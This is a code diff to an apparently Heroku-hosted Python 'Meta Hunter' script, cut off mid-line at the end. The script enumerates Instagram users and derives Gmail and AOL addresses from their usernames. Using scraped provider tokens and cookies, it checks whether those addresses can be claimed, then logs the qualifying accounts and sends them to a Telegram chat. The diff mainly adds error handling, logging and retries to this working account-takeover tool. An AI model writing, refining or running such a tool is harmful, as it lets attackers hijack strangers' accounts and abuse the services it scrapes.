@@ -24,23 +24,25 @@ if not (CHAT_ID and TOKEN):
     raise RuntimeError("❌ CHAT_ID and TOKEN must be set as environment variables.")
 
 # Pre-launch banner (appears in Heroku logs)
-banner = render('{PRINCE}', colors=['white', 'red'], align='center')
-print(f"\n{banner}\n")
+try:
+    banner = render('{PRINCE}', colors=['white', 'red'], align='center')
+    print(f"\n{banner}\n")
+except Exception as e:
+    print("[Banner Render Error]", e)
 print(Style.BRIGHT + Fore.CYAN + "🔄 Meta Hunter Worker starting on Heroku...\n")
 
-# Counters and locks
 aca = total = hits = badinsta = bademail = goodig = 0
 infoinsta = {}
 counter_lock = Lock()
 
-# For print frequency control
 last_status_time = 0
 status_lock = Lock()
 
 # Determine bbk and id_max based on YEAR env var
 try:
     yr = int(YEAR)
-except:
+except Exception as e:
+    print("[YEAR ENV ERROR]", e)
     yr = 0
 
 if yr == 1:
@@ -71,7 +73,6 @@ elif yr == 9:
     bbk = 8597939245
     id_max = 21254029834
 else:
-    # Default: full range 2010–2023
     bbk = 10000
     id_max = 21254029834
 
@@ -113,13 +114,18 @@ def rest(user):
             }
         )
         return response.json().get('email', 'no REST !')
-    except:
+    except Exception as e:
+        print("[REST ERROR]", e)
         return 'no REST !'
 
 def check_gmail(email):
     global hits, bademail
     try:
         local = email.split('@')[0] if '@' in email else email
+        # Make sure tl.txt exists
+        if not os.path.exists('tl.txt'):
+            print("tl.txt missing! Calling tll() again...")
+            tll()
         with open('tl.txt', 'r') as f:
             line = f.read().splitlines()[0]
         tl, host = line.split('//')
@@ -164,7 +170,8 @@ def check_gmail(email):
             with counter_lock:
                 bademail += 1
             pppp()
-    except Exception:
+    except Exception as e:
+        print("[GMAIL CHECK ERROR]", e)
         with counter_lock:
             bademail += 1
         pppp()
@@ -173,6 +180,10 @@ def check_aol(email):
     global hits, bademail
     try:
         name = email.split('@')[0] if '@' in email else email
+        # Make sure aol_req.txt and aol_cok.txt exist
+        if not (os.path.exists('aol_req.txt') and os.path.exists('aol_cok.txt')):
+            print("aol_req.txt or aol_cok.txt missing! Calling Getaol() again...")
+            Getaol()
         with open("aol_req.txt", "r") as f:
             specData, specId, crumb, sessionIndex, acrumb = f.read().strip().split('Π')
         with open("aol_cok.txt", "r") as f:
@@ -242,7 +253,8 @@ def check_aol(email):
             with counter_lock:
                 bademail += 1
             pppp()
-    except Exception:
+    except Exception as e:
+        print("[AOL CHECK ERROR]", e)
         with counter_lock:
             bademail += 1
         pppp()
@@ -275,6 +287,7 @@ def check(email):
             data=data
         ).text
         if email in response:
+            print(f"[CHECK] {email} found on IG, now checking provider...")
             if '@gmail.com' in email:
                 check_gmail(email)
             else:
@@ -286,7 +299,8 @@ def check(email):
             with counter_lock:
                 badinsta += 1
             pppp()
-    except Exception:
+    except Exception as e:
+        print("[CHECK ERROR]", e)
         with counter_lock:
             badinsta += 1
         pppp()
@@ -309,7 +323,8 @@ def InfoAcc(username, domain):
 
     try:
         meta = int(fows) >= 10 and int(pp_count) >= 2
-    except:
+    except Exception as e:
+        print("[InfoAcc META ERROR]", e)
         meta = False
 
     rest_info = rest(username)
@@ -337,8 +352,11 @@ def InfoAcc(username, domain):
         "𝐁𝐘 @ankuuxx | 𝐉𝐎𝐈𝐍 @Raosahab_ankuu"
     )
 
-    with open('ANI2TO.txt', 'a') as ff:
-        ff.write(ss + "\n\n")
+    try:
+        with open('ANI2TO.txt', 'a') as ff:
+            ff.write(ss + "\n\n")
+    except Exception as e:
+        print("[File Write ERROR]", e)
 
     send_telegram(ss)
 
@@ -388,8 +406,10 @@ def tll():
         host = response.cookies.get_dict().get('__Host-GAPS', host)
         with open('tl.txt', 'w') as f:
             f.write(f'{tl}//{host}\n')
+        print("[tll] tl.txt generated")
     except Exception as e:
         print(Fore.RED + f"tll error: {e}")
+        time.sleep(2)
         tll()
 
 def Getaol():
@@ -419,14 +439,16 @@ def Getaol():
         for fname in ('aol_req.txt', 'aol_cok.txt'):
             try:
                 os.remove(fname)
-            except:
+            except Exception:
                 pass
         with open('aol_req.txt', 'w') as t:
             t.write(f"{specData}Π{specId}Π{crumb}Π{sessionIndex}Π{acrumb}\n")
         with open('aol_cok.txt', 'w') as g:
             g.write(str(cookies) + "\n")
+        print("[Getaol] aol_req.txt and aol_cok.txt generated")
     except Exception as e:
         print(Fore.RED + f"Getaol error: {e}")
+        time.sleep(2)
         Getaol()
 
 def gg_worker():
@@ -455,26 +477,34 @@ def gg_worker():
                 json_data = response.json()
                 user_data = json_data.get('data', {}).get('user')
                 if not isinstance(user_data, dict):
+                    # Worker running but no user_data found, that's fine.
                     continue
                 username = user_data.get('username')
                 if username:
+                    print(f"[WORKER] Processing IG user: {username}")
                     infoinsta[username] = user_data
                     emails = [f"{username}@gmail.com", f"{username}@aol.com"]
                     for email in emails:
                         check(email)
             except Exception as e:
+                print("[WORKER JSON ERROR]", e)
                 continue
         except Exception as e:
+            print("[WORKER ERROR]", e)
             continue
 
 if __name__ == "__main__":
+    print("[MAIN] Calling tll()...")
     tll()
+    print("[MAIN] Calling Getaol()...")
     Getaol()
-    THREADS = int(os.getenv('THREADS', '200'))  # Default 200, can be set in env
+    THREADS = int(os.getenv('THREADS', '20'))  # Default 20 threads
+    print(f"[MAIN] Starting {THREADS} threads...")
     for _ in range(THREADS):
         Thread(target=gg_worker, daemon=True).start()
+    print("[MAIN] All threads started.")
     while True:
         # 1 minute active
+        print("[MAIN] Main loop sleeping 60s...")
         time.sleep(60)
-        # 10 second sleep
-        time.sleep(10)
+        print("[MAIN] Mai
